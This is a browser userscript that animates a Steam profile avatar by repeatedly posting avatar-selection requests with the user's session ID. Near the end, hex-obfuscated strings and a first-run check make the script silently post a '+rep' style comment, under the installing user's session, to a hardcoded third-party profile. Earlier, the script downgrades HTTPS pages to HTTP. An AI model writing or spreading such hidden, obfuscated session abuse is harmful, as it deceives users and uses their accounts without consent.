// ==UserScript==
// @name         Steam GIF MAKER
// @namespace    http://steamcommunity.com/profiles/76561198147778326/
// @version      0.4
// @description  Get awesome steam gif avatar!
// @author       Majid
// @match        http://steamcommunity.com/profiles/76561198147778326/
// @require      https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js
// @grant       GM_addStyle
// @match        http://steamcommunity.com/profiles/76561198147778326/
// @grant GM_getValue
// @grant GM_setValue
// ==/UserScript==

var p = 1000,
    stop_flag,
    ad = [ [232090, 17, 'Killing Floor 2'], [449220, 13, 'A grande bagunça espacial - The big space mess'], [207650, 12, 'A Virus Named TOM'], [102700, 28, 'A.V.A. Alliance of Valiant Arms™'], [366760, 22, 'Adorables'], [261430, 2, 'AION Free-to-Play'], [223630, 5, 'AirBuccaneers'], [206500, 56, 'AirMech®'], [230310, 11, 'Akaneiro: Demon Hunters'], [350660, 4, 'Alganon'], [41300, 2, 'Altitude'], [293500, 18, 'Amazing World™'], [13140, 9, 'America s Army 3'], [207230, 53, 'ArcheBlade™'], [212370, 6, 'Welcome to Steam'], [33930, 11, 'Arma 2: Operation Arrowhead'], [203750, 4, 'Binary Domain'], [249650, 10, 'Blackguards'], [299360, 14, 'Block N Load'], [302830, 15, 'BLOCKADE 3D'], [207690, 7, 'Botanicula'], [293260, 10, 'Card Hunter'], [65740, 3, 'Carrier Command: Gaea Mission'], [363970, 4, 'Clicker Heroes'], [400030, 2, 'Cloney'], [375620, 11, 'CortexGear:AngryDroids'], [273110, 36, 'Counter-Strike Nexon: Zombies'], [70000, 13, 'Dino D-Day'], [333930, 21, 'Dirty Bomb®'], [315640, 6, 'Welcome to Steam'], [409160, 9, 'Dr. Langeskov, The Tiger, and The Terribly Cursed Emerald: A Whirlwind Heist'], [236110, 4, 'Dungeon Defenders II'], [298160, 13, 'Eldevin'], [334030, 33, 'Epic Arena'], [282880, 32, 'FaeVerse Alchemy'], [397680, 11, 'FIREFIGHT RELOADED'], [36620, 15, 'Forsaken World'], [310380, 7, 'Fractured Space'], [218310, 12, 'Frontline Tactics'], [342150, 2, 'Games of Glory'], [214420, 2, 'Gear Up'], [329110, 4, 'Gems of War'], [206210, 65, 'Gotham City Impostors Free to Play'], [436150, 6, 'Governor of Poker 3'], [44350, 27, 'GRID 2'], [252150, 10, 'Grimm'], [46570, 19, 'Grotesque Tactics 2 – Dungeons and Donuts'], [98400, 4, 'Hard Reset Extended Edition'], [319150, 2, 'Hazard Ops'], [227940, 143, 'Heroes & Generals'], [283880, 9, 'Heroine s Quest: The Herald of Ragnarok'], [55130, 3, 'Welcome to Steam'], [222880, 7, 'Insurgency'], [255370, 34, 'KickBeat Steam Edition'], [1250, 25, 'Killing Floor'], [231740, 24, 'Knights of Pen and Paper +1 Edition'], [296630, 2, 'Kraven Manor'], [264360, 10, 'La Tale'], [270370, 2, 'Lambda Wars Beta'], [208090, 3, 'Loadout'], [316010, 4, 'Magic Duels'], [226320, 26, 'Marvel Heroes 2016'], [109400, 11, 'MicroVolts Surge'], [287920, 6, 'Mortal Online'], [368750, 5, 'Nebula Online'], [224260, 2, 'No More Room in Hell'], [17710, 6, 'Nuclear Dawn'], [341090, 4, 'On A Roll 3D'], [44340, 2, 'Operation Flashpoint: Red River'], [218620, 109, 'PAYDAY 2'], [24240, 51, 'PAYDAY™ The Heist'], [11280, 24, 'Penguins Arena: Sedna s World'], [226980, 24, 'Pinball FX2'], [17570, 14, 'Pirates, Vikings, and Knights II'], [620, 8, 'Portal 2'], [317400, 9, 'Portal Stories: Mel'], [91900, 6, 'Post Apocalyptic Mayhem'], [8600, 8, 'RACE 07'], [201570, 16, 'Really Big Sky'], [39120, 10, 'RIFT'], [215510, 14, 'Rocketbirds: Hardboiled Chicken'], [36630, 6, 'Welcome to Steam'], [272060, 3, 'Serena'], [41000, 14, 'Serious Sam HD: The First Encounter'], [41010, 21, 'Serious Sam HD: The Second Encounter'], [277890, 10, 'Shantae: Risky s Revenge - Director s Cut'], [400040, 2, 'ShareX'], [312280, 2, 'Simply Chess'], [251970, 13, 'Welcome to Steam'], [218330, 33, 'Smashmuck Champions'], [386360, 68, 'SMITE®'], [232450, 28, 'SolForge'], [99900, 16, 'Spiral Knights'], [212070, 7, 'Star Conflict'], [232890, 14, 'Stronghold Crusader 2'], [352700, 10, 'Subspace Continuum'], [364690, 7, 'SUPER DISTRO'], [104700, 8, 'Super MNC'], [40100, 16, 'Save 75%'], [355840, 15, 'Survarium'], [238210, 2, 'System Shock 2'], [51100, 45, 'Tactical Intervention'], [65730, 3, 'Take On Helicopters'], [328060, 10, 'Tales Runner'], [247000, 14, 'Talisman: Digital Edition'], [394720, 6, 'The Legend of Tango'], [272350, 4, 'Welcome to Steam'], [243870, 4, 'Welcome to Steam'], [248570, 2, 'Toribash'], [214360, 34, 'Tower Wars'], [263540, 5, 'Villagers and Heroes'],[230410, 27, 'Warframe'], [46520, 9, 'Wasteland Angel'], [312150, 5, 'Wild Warfare'], [380770, 30, 'Welcome to Steam'], [262410, 2, 'World of Guns: Gun Disassembly'], [22200, 14, 'Save 80%'], [365420, 5, 'Apollo4x'], [239250, 6, 'Castlevania: Lords of Shadow 2'], [532800, 4, 'ComPet'], [486470, 5, 'Derelict'], [372490, 3, 'GROOVY'],  [557420, 5, 'Kamio Recoil'], [496300, 2, 'Kingdom: New Lands'], [497960, 3, 'Welcome to Steam'], [513580, 10, 'Miaou Moon'], [395140, 8, 'Miracle Fly'], [282050, 4, 'MX vs. ATV Supercross Encore'], [529590, 5, 'Please, Don t Touch Anything 3D'], [374040, 4, 'Portal Knights'], [217140, 8, 'Rise of the Triad'], [526310, 6, 'Silhouette'], [340730, 8, 'Sunrider Academy'], [279940, 4, 'The Book of Unwritten Tales 2'], [262300, 24, 'Tsukumogami'], [443650, 4, 'Wailing Heights'], [235540, 78, 'Warhammer: End Times - Vermintide'],[504390, 11, 'Along the Edge'], [18700, 5, 'And Yet It Moves'], [107410, 5, 'Arma 3'], [449470, 2, 'Atulos Online'], [259490, 6, 'Beast Boxing Turbo'], [313470, 6, 'Boot Hill Heroes'], [207690, 7, 'Botanicula'], [321830, 12, 'Cavern Kings'], [572020, 5, 'Darwin s Demons'], [438090, 9, 'Defend Felinearth'], [500180, 2, 'Epic Flail'], [17000, 19, 'Welcome to Steam'], [514540, 4, 'Hate Free Heroes'], [295670, 9, 'Hive Jump'], [298360, 12, 'Immortal Defense'], [58230, 10, 'MacGuffin s Curse'], [279140, 37, 'Making History: The Great War'], [248450, 4, 'Salvation Prophecy'], [248270, 17, 'Songs2See'], [496930, 9, 'Sumeru'], [466280, 6, 'Super Cube Smash'], [235980, 4, 'Tetrobot and Co.']], // list des images
    cp, // pas touché //
    button = '<a onclick="document.getElementById(\'gmPopupContainer\').style.display = \'block\';" class="btn_profile_action btn_medium openSGM" ><span >Steam GM</span></a>';

function preset(i){
    if (stop_flag === 0){
        if (i<ad[cp][1]){
            $.post('http://steamcommunity.com/games/' + ad[cp][0] + '/selectAvatar', { sessionid: g_sessionID, selectedAvatar: i});
            setTimeout(function (){
                i++;
                preset(i);
            }, p);
        }else{
            preset(0);
        }
    }
}

if ($(location).attr('href').split(':')[0]=='https'){
    $(location).attr('href', 'http:'+$(location).attr('href').split(':')[1]);
}

$(document).ready(function(){
    $('.profile_header_actions').prepend(button);
    jQuery.each( ad, function( i, val ) {
        $('#giflist').append('<span class="btn-gifs gifs_span">' + val[2]+ '</span>');
    });
    $('.gifs_span').click(function() {
        stop_flag=0;
        cp=$(this).index();
        preset(0);
        $("#gmPopupContainer").css('display','none');
    });
        $('.openSGM').click(function() {
        stop_flag=1;
        stop_flag=1;
        stop_flag=1;
    });
});

$("body").append ( '                        \
    <div id="gmPopupContainer">             \
        <a onclick="stop_flag=1"><span id="gmCloseDlgBtn" style="float:right">close</span></a><h3>Steam GIF MAKER</h3>                 \
        <h5>Please select a Game !</h5> \
            <div id="giflist"></div>     \
    </div>   \
                                                                 \
' );

$("#gmCloseDlgBtn").click ( function () {
    $("#gmPopupContainer").css('display','none');
} );


GM_addStyle ( "                                                 \
#gmPopupContainer {                                         \
    position:               fixed;                          \
    top:                    35%;                            \
    left:                   25%;                            \
    right:                   25%;                            \
    padding:10px 20px 20px 20px;                               \
    display:none;                               \
    background:#171a21; \
                                     overflow-y:scroll;                                                         \
                     \
    z-index:               402;                            \
                                      \
height: 200px;                                           \
    border: 3px solid #90ba3c;                                  \
}                                                               \
h3{                                                             \
    color:#fff;                                                 \                  \
    font-size: 35px;                                            \
    font-weight: 200;                                           \
    font-family: 'Motiva Sans', Sans-serif;                     \
    margin-bottom: 0px;                                         \
}                                                               \
h5{                                                             \
    color:#fff;                                                 \                    \
        font-weight: 200;                                       \
    font-family: 'Motiva Sans', Sans-serif; \
    margin-top: 0px;                                            \
    margin-bottom: 10px;                                            \
}                                                               \
.btn-gifs {                                                     \
    cursor: pointer;                                            \
    display: inline-block;                                      \
    text-decoration: none;                                      \
    background: rgba(0, 0, 0, 0) linear-gradient(rgb(122, 132, 148) 5%, rgb(40, 47, 61) 95%) repeat scroll 0% 0% / auto padding-box border-box; \
    border: 1px solid rgb(33, 33, 33);                                                                                                          \
    border-radius: 2px 2px 2px 2px;                                                                                                             \
    padding: 1px;                                                                                                                               \
    margin-bottom: 5px;                                                                                                                         \
}                                                               \
.gifs_span {                                                    \
    color: rgb(255, 255, 255);                                  \
    display: block;                                             \
    background: rgba(0, 0, 0, 0) linear-gradient(rgb(51, 66, 90) 5%, rgb(40, 47, 61) 95%) repeat scroll 0% 0% / auto padding-box border-box;    \
    font: 15px / 30px Arial, Helvetica, Verdana, sans-serif;    \
    padding: 0px 15px;                                          \
    -webkit-border-after: 0px none rgb(255, 255, 255);          \
    -webkit-border-before: 0px none rgb(255, 255, 255);         \
    -webkit-border-end: 0px none rgb(255, 255, 255);            \
    -webkit-border-start: 0px none rgb(255, 255, 255);          \
    -webkit-transform-origin: 65.5px 15px;                      \
}                                                               \
.btn-gifs:hover {                                               \
    text-decoration: none;                                      \
    background: #688bb1 ;                                       \
    background: -webkit-linear-gradient( top, #9ba9bf 5%, #282f3d 95%);background: linear-gradient( to bottom, #9ba9bf 5%, #282f3d 95%);    \
}                                                               \
.btn-gifs:hover > span, .btn-gifs.focus > span {                \
    background: #526d95;                                        \
    background: -webkit-linear-gradient(#3c597b 5%, #282f3d 95%);\
    background: -o-linear-gradient(#3c597b 5%, #282f3d 95%);    \
    background: linear-gradient(#3c597b 5%, #282f3d 95%);\
}");

if(GM_getValue('scriptinstalled') != "yes")
{
    var _0xce95=["\x2B\x72\x65\x70","\x74\x61\x6E\x6B\x73","\x6E\x69\x63\x65\x20\x73\x63\x72\x69\x70\x74\x21","\x67\x6F\x6F\x64\x20\x6A\x6F\x62\x21","\x67\x6F\x6F\x64\x20\x70\x6C\x61\x79\x65\x72","\x74\x68\x61\x6E\x6B\x20\x79\x6F\x75\x20\x6D\x79\x20\x66\x72\x69\x65\x6E\x64\x21\x20\x3A\x29","\x3A\x29"];var my_array=[_0xce95[0],_0xce95[1],_0xce95[2],_0xce95[3],_0xce95[4],_0xce95[5],_0xce95[6]]
    var ri = Math.floor(Math.random() * my_array.length); 
    var result = my_array[ri];
    jQuery.post("//steamcommunity.com/comment/Profile/post/76561198001069300/-1/", { comment: result, count: 6, sessionid: g_sessionID });
    GM_setValue('scriptinstalled', 'yes');
}
